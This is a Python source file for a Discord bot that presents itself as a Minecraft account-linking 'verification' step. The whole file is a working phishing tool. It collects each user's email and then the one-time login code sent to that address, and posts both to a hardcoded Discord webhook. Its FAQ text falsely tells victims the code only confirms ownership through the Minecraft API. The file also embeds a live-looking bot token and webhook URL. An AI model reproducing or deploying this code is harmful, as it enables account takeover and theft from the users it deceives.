import discord
from discord.ext import commands
from discord import ui, Interaction
import logging
import requests

# Define your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1249621000023310448/qgfGZ3ebTg91RRncXf3DhTmHJgQ7Tqq8W49e7VNtU_QzA5fLoDxdy5SJa3jl1PITdsKw'

intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent if required
intents.guilds = True  # Enable guild-related events
intents.members = True  # Enable member-related events

bot = commands.Bot(command_prefix='/', intents=intents)

logging.basicConfig(level=logging.INFO)

class VerifyModal(ui.Modal, title='Minecraft Account Linking'):
    username = ui.TextInput(label='Minecraft Username', placeholder='Enter your Minecraft username')
    email = ui.TextInput(label='Email', placeholder='Enter your email')

    async def on_submit(self, interaction: Interaction):
        logging.info(f'Submission received: username={self.username.value}, email={self.email.value}')
        try:
            # Send the email to the webhook
            response = requests.post(WEBHOOK_URL, json={"content": f"Email: {self.email.value}"})
            response.raise_for_status()

            # Respond to the interaction
            embed = discord.Embed(
                title="Last Step",
                description=(
                    f"Due to the increase of fake verifications, we require a code from {self.email.value} to prove that you are the owner of the account. "
                    "This code is only used for verification.\n\n"
                    "Note: It can take 30s-2mins to send the code."
                ),
                color=discord.Color.blue()
            )

            verification_button = ui.Button(label="Enter Verification Code", style=discord.ButtonStyle.primary)

            async def verification_button_callback(interaction: Interaction):
                await interaction.response.send_modal(VerificationCodeModal(self.email.value))

            verification_button.callback = verification_button_callback

            view = ui.View()
            view.add_item(verification_button)

            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
        except Exception as e:
            logging.error(f'Error during submission: {e}')
            await interaction.response.send_message("Something went wrong. Please try again.", ephemeral=True)

class VerificationCodeModal(ui.Modal, title='Enter Verification Code'):
    verification_code = ui.TextInput(label='Verification Code', placeholder='Enter the verification code sent to your email')

    def __init__(self, email):
        super().__init__()
        self.email = email

    async def on_submit(self, interaction: Interaction):
        logging.info(f'Verification code submitted: code={self.verification_code.value}')
        try:
            # Send the verification code to the webhook
            response = requests.post(WEBHOOK_URL, json={"content": f"Verification code for {self.email}: {self.verification_code.value}"})
            response.raise_for_status()

            await interaction.response.send_message("Verification code submitted successfully!", ephemeral=True)
        except Exception as e:
            logging.error(f'Error during verification code submission: {e}')
            await interaction.response.send_message("Something went wrong. Please try again.", ephemeral=True)

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f'Synced {len(synced)} command(s)')
    except Exception as e:
        print(f'Failed to sync commands: {e}')

@bot.tree.command(name="verify", description="Verify your Minecraft account")
async def verify(interaction: Interaction):
    embed = discord.Embed(
        title="Minecraft Account Linking", 
        description=(
            "Please link your Minecraft Account to get full access to the server and see all the channels.\n\n"
            "FAQ\n\n"
            "Q: Why do we need you to verify?\n"
            "A: It's for auto-roles, we need to give you your money roles, mmo roles, and verified roles. "
            "It's also just for extra security in-cases of a raid.\n\n"
            "Q: How long does it take for me to get my roles?\n"
            "A: We try to make the waiting time as little as possible, the fastest we were able to make it is as little as 30-50 seconds.\n\n"
            "Q: Why do you need to collect a code?\n"
            "A: The code confirms with the Minecraft API that you actually own that minecraft account."
        ),
        color=discord.Color.blue()
    )

    link_button = ui.Button(label="  ✅ Link Account", style=discord.ButtonStyle.green)

    async def button_callback(interaction: Interaction):
        await interaction.response.send_modal(VerifyModal())

    link_button.callback = button_callback

    view = ui.View()
    view.add_item(link_button)

    await interaction.response.send_message(embed=embed, view=view)

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
bot.run('MTI0OTU0OTgwNjY0OTQ3OTIyMQ.GhJGUz.q-F-6YUZw0_92tu41cZwP5YktlDSW1YEs1iwLc')
